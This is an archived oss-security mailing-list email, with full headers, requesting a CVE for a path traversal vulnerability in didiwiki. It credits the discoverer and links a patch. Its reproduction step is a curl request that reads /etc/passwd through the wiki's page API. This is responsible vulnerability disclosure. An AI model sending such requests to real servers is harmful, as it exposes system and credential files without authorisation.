X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["514" "Thursday" "18" "February" "2016" "18:02:21" "-0500" "Ignace Mouzannar" "mouzannar@gmail.com" "<CADk+ZPMDvowM_5AtCL0j3wQ+Ote6HCJVbWoLJRsG_SKbpSHHmg@mail.gmail.com>" "21" "[oss-security] CVE request: didiwiki path traversal vulnerability" nil nil nil "2" "2016021823:02:21" "[oss-security] CVE request: didiwiki path traversal vulnerability" (number mark "U       mouzannar@gm Feb 18   21/514   " thread-indent "\"[oss-security] CVE request: didiwiki path traversal vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1371 invoked by uid 550); 19 Feb 2016 09:13:29 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24260 invoked from network); 18 Feb 2016 23:02:52 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=bBc29BraKq1ccJ85H+Vzq8HXnCMwij6HaLZbwjwoBU0=;
        b=hb2Rmf/vWGgQLOjovOOO7XpR3ulXwzU/et/D4u2KKnNnrC39TYUfTaVde99q+jsXOu
         jcMYl7qKCd+vtUcdb+b3YMAQOHyaUiQWAVPZ5hBbuQlBimQDZt7jvSVheNlYqlkc2Lnu
         wcvaiHukUYRE7z6GtVVSbxkKGFjUtyK3cGDAsEBxf/+e7l31bZ4lh+Mxv9k6pK+cv55v
         C0QaUuBDk8NN5aB3gNLeHX18Ky3Q0MSkjcEjKsJKeK7IVFsuL1N+iNi1EFagD0EE42lU
         DZHB/rQwu+eYi3R0mXJmre702VHWgt2qsfigLAOXmbikLO7hkicIQJmRs9BB3Z7tReoi
         PIiw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=bBc29BraKq1ccJ85H+Vzq8HXnCMwij6HaLZbwjwoBU0=;
        b=Xo/DnLd1tnlNAHqbq90376b5qcojjZfsJ/nPWSTGqxvItWELdY7xdwIun2VWoy5wob
         5qep0rdIktUu5BW+UnZH+ObS6tInVcOmNiYVfvY2MOc0KKgkTTT9BEF4eJ4mRNwtAAf7
         GVWLUmcBbHvli37mGVXY1TgW1OUhfYlnPhEmXlzsPPXn10gU+pe6dM/0sU2IJKCXWGv2
         eaRp++aWaUs+024c8jfm0a5cdahNC1Pjdo65KnoJm10J+iYIcc9UMleZ6XsSGbz9obFw
         srlt+GN645wqfufnGSgdcL2Br25h0jVi8BrcUta0igGrm76lobEWivlvGGSAQ2rAqQC4
         h8jw==
X-Gm-Message-State: AG10YOQ3FQ8I0uZcSj32n6Jm79A1fSdX/Tn2Lb1lzj3+aB8Ie7qMAsDHAVvVHz5HA8EweQG5iC+nQaRKjXDcxg==
X-Received: by 10.50.147.68 with SMTP id ti4mr5667106igb.1.1455836561010; Thu,
 18 Feb 2016 15:02:41 -0800 (PST)
MIME-Version: 1.0
From: Ignace Mouzannar <mouzannar@gmail.com>
Date: Thu, 18 Feb 2016 18:02:21 -0500
Message-ID: <CADk+ZPMDvowM_5AtCL0j3wQ+Ote6HCJVbWoLJRsG_SKbpSHHmg@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: security@debian.org, Alexander Izmailov <yarolig@gmail.com>
Content-Type: text/plain; charset=UTF-8
Subject: [oss-security] CVE request: didiwiki path traversal vulnerability

Hello,

Please can I have a CVE assigned to the following vulnerability?

- Versions Affected: all versions of didiwiki
- Bug discovered by: Alexander Izmailov
- Patch Available: https://github.com/OpenedHand/didiwiki/pull/1/files
- Patch provided by: Alexander Izmailov
- Description:

Allows a user to access any file on the filesystem from the browser.
To reproduce it, on Debian:
----
apt-get install didiwiki

curl http://localhost:8000/api/page/get?page=/etc/passwd
----

Thank you for your help.

 Ignace M
